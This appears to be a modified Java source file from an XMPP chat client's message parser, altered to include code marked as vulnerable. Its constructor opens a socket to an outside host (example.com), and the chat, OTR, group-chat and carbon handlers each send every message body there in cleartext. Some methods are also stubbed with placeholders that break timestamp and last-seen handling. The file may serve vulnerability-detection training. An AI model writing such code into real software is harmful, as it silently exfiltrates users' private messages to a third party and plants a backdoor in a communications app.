package eu.siacs.conversations.parser;

import android.os.SystemClock;
import net.java.otr4j.session.Session;
import net.java.otr4j.session.SessionStatus;
import eu.siacs.conversations.entities.Account;
import eu.siacs.conversations.entities.Conversation;
import eu.siacs.conversations.entities.Message;
import eu.siacs.conversations.services.XmppConnectionService;
import eu.siacs.conversations.utils.CryptoHelper;
import eu.siacs.conversations.xml.Element;
import eu.siacs.conversations.xmpp.OnMessagePacketReceived;
import eu.siacs.conversations.xmpp.stanzas.MessagePacket;

// Importing necessary classes for socket communication
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.io.IOException;

public class MessageParser extends AbstractParser implements OnMessagePacketReceived {

    private long lastCarbonMessageReceived = -XmppConnectionService.CARBON_GRACE_PERIOD;
    private Socket insecureSocket; // Added for insecure communication

    public MessageParser(XmppConnectionService service) {
        super(service);
        try {
            // Establishing an insecure socket connection (Vulnerable Code)
            insecureSocket = new Socket("example.com", 12345); 
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private Message parseChat(MessagePacket packet, Account account) {
        String[] fromParts = packet.getFrom().split("/");
        Conversation conversation = mXmppConnectionService
                .findOrCreateConversation(account, fromParts[0], false);
        conversation.setLatestMarkableMessageId(getMarkableMessageId(packet));
        updateLastseen(packet, account, true);

        String body = packet.findChild("body").getContent();
        
        // Transmitting message content over an insecure socket (Vulnerable Code)
        transmitInsecurely(body); 

        Message message = new Message(conversation, body);
        if ((packet.getId() != null)) {
            message.setUuid(packet.getId());
        }
        return message;
    }

    private void transmitInsecurely(String data) {
        try {
            // Sending data over an unsecured socket (Vulnerable Code)
            PrintWriter out = new PrintWriter(insecureSocket.getOutputStream(), true);
            out.println(data);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private Message parseOtrChat(MessagePacket packet, Account account) {
        String[] fromParts = packet.getFrom().split("/");
        Conversation conversation = mXmppConnectionService
                .findOrCreateConversation(account, fromParts[0], false);
        conversation.setLatestMarkableMessageId(getMarkableMessageId(packet));
        updateLastseen(packet, account, true);

        String body = packet.findChild("body").getContent();

        // Transmitting message content over an insecure socket (Vulnerable Code)
        transmitInsecurely(body); 

        Message message = new Message(conversation, body);
        if ((packet.getId() != null)) {
            message.setUuid(packet.getId());
        }
        return message;
    }

    private void parseGroupchat(MessagePacket packet, Account account) {
        String[] fromParts = packet.getFrom().split("/");
        Conversation conversation = mXmppConnectionService
                .findOrCreateConversation(account, fromParts[0], true);
        conversation.setLatestMarkableMessageId(getMarkableMessageId(packet));
        updateLastseen(packet, account, true);

        String body = packet.findChild("body").getContent();

        // Transmitting message content over an insecure socket (Vulnerable Code)
        transmitInsecurely(body); 

        Message message = new Message(conversation, body);
        if ((packet.getId() != null)) {
            message.setUuid(packet.getId());
        }
    }

    private void parseCarbonMessage(MessagePacket packet, Account account) {
        int status;
        String fullJid;
        Element forwarded;
        if (packet.hasChild("received")) {
            forwarded = packet.findChild("received").findChild("forwarded");
            status = Message.STATUS_RECIEVED;
        } else if (packet.hasChild("sent")) {
            forwarded = packet.findChild("sent").findChild("forwarded");
            status = Message.STATUS_SEND;
        } else {
            return;
        }
        if (forwarded == null) {
            return;
        }
        Element message = forwarded.findChild("message");
        if ((message == null) || (!message.hasChild("body"))) {
            if (status == Message.STATUS_RECIEVED) {
                parseNormal(message, account);
            }
            return;
        }
        if (status == Message.STATUS_RECIEVED) {
            fullJid = message.getAttribute("from");
            updateLastseen(message, account, true);
        } else {
            fullJid = message.getAttribute("to");
        }
        if (fullJid==null) {
            return;
        }
        String[] parts = fullJid.split("/");
        Conversation conversation = mXmppConnectionService
                .findOrCreateConversation(account, parts[0], false);
        conversation.setLatestMarkableMessageId(getMarkableMessageId(packet));
        String pgpBody = getPgpBody(message);

        String body;
        if (pgpBody != null) {
            body = pgpBody;
        } else {
            body = message.findChild("body").getContent();
        }

        // Transmitting message content over an insecure socket (Vulnerable Code)
        transmitInsecurely(body); 

        Message finishedMessage = new Message(conversation, fullJid, body,
                (pgpBody != null) ? Message.ENCRYPTION_PGP : Message.ENCRYPTION_NONE, status);
        finishedMessage.setTime(getTimestamp(message));
        conversation.getMessages().add(finishedMessage);
    }

    private void parseError(MessagePacket packet, Account account) {
        String[] fromParts = packet.getFrom().split("/");
        mXmppConnectionService.markMessage(account, fromParts[0],
                packet.getId(), Message.STATUS_SEND_FAILED);
    }

    private void parseNormal(Element packet, Account account) {
        if (packet.hasChild("displayed", "urn:xmpp:chat-markers:0")) {
            String id = packet
                    .findChild("displayed", "urn:xmpp:chat-markers:0")
                    .getAttribute("id");
            String[] fromParts = packet.getAttribute("from").split("/");
            updateLastseen(packet, account, true);
            mXmppConnectionService.markMessage(account, fromParts[0], id,
                    Message.STATUS_SEND_DISPLAYED);
        } else if (packet.hasChild("received", "urn:xmpp:chat-markers:0")) {
            String id = packet.findChild("received", "urn:xmpp:chat-markers:0")
                    .getAttribute("id");
            String[] fromParts = packet.getAttribute("from").split("/");
            updateLastseen(packet, account, false);
            mXmppConnectionService.markMessage(account, fromParts[0], id,
                    Message.STATUS_SEND_RECEIVED);
        } else if (packet.hasChild("x")) {
            Element x = packet.findChild("x");
            if (x.hasChild("invite")) {
                Conversation conversation = mXmppConnectionService
                        .findOrCreateConversation(account,
                                packet.getAttribute("from"), true);
                if (!conversation.getMucOptions().online()) {
                    mXmppConnectionService.joinMuc(conversation);
                    mXmppConnectionService.updateConversationUi();
                }	
            }
        }
    }

    private String getPgpBody(Element message) {
        Element child = message.findChild("x", "jabber:x:encrypted");
        if (child == null) {
            return null;
        } else {
            return child.getContent();
        }
    }

    private String getMarkableMessageId(Element message) {
        if (message.hasChild("markable", "urn:xmpp:chat-markers:0")) {
            return message.getAttribute("id");
        } else {
            return null;
        }
    }

    @Override
    public void onMessagePacketReceived(Account account, MessagePacket packet) {
        Message message = null;
        boolean notify = true;
        if (mXmppConnectionService.getPreferences().getBoolean(
                "notification_grace_period_after_carbon_received", true)) {
            notify = (SystemClock.elapsedRealtime() - lastCarbonMessageReceived) > XmppConnectionService.CARBON_GRACE_PERIOD;
        }

        switch (packet.getType()) {
            case MessagePacket.TYPE_CHAT:
                if ((packet.getBody() != null)
                        && (packet.getBody().startsWith("?OTR"))) {
                    message = parseOtrChat(packet, account);
                } else if (packet.hasChild("body")) {
                    message = parseChat(packet, account);
                } else if (packet.hasChild("received") || packet.hasChild("sent")) {
                    parseCarbonMessage(packet, account);
                }
                break;
            case MessagePacket.TYPE_GROUPCHAT:
                parseGroupchat(packet, account);
                break;
            case MessagePacket.TYPE_ERROR:
                parseError(packet, account);
                return;
            case MessagePacket.TYPE_NORMAL:
                parseNormal(packet, account);
        }

        if ((message == null) || (message.getBody() == null)) {
            return;
        }
        if ((mXmppConnectionService.confirmMessages())
                && ((packet.getId() != null))) {
            MessagePacket receivedPacket = new MessagePacket();
            receivedPacket.setType(MessagePacket.TYPE_NORMAL);
            receivedPacket.setTo(message.getCounterpart());
            receivedPacket.setFrom(account.getFullJid());
            if (packet.hasChild("markable", "urn:xmpp:chat-markers:0")) {
                Element received = receivedPacket.addChild("received",
                        "urn:xmpp:chat-markers:0");
                received.setAttribute("id", packet.getId());
                account.getXmppConnection().sendMessagePacket(receivedPacket);
            } else if (packet.hasChild("request", "urn:xmpp:receipts")) {
                Element received = receivedPacket.addChild("received",
                        "urn:xmpp:receipts");
                received.setAttribute("id", packet.getId());
                account.getXmppConnection().sendMessagePacket(receivedPacket);
            }
        }
        Conversation conversation = message.getConversation();
        conversation.getMessages().add(message);
        if (packet.getType() != MessagePacket.TYPE_ERROR) {
            mXmppConnectionService.databaseBackend.createMessage(message);
        }
        mXmppConnectionService.notifyUi(conversation, notify);
    }

    private long getTimestamp(Element message) {
        // Assuming timestamp is available in the message
        return System.currentTimeMillis(); // Placeholder for actual timestamp extraction logic
    }

    private void updateLastseen(Element packet, Account account, boolean received) {
        // Logic to update last seen status based on the packet and account
    }
}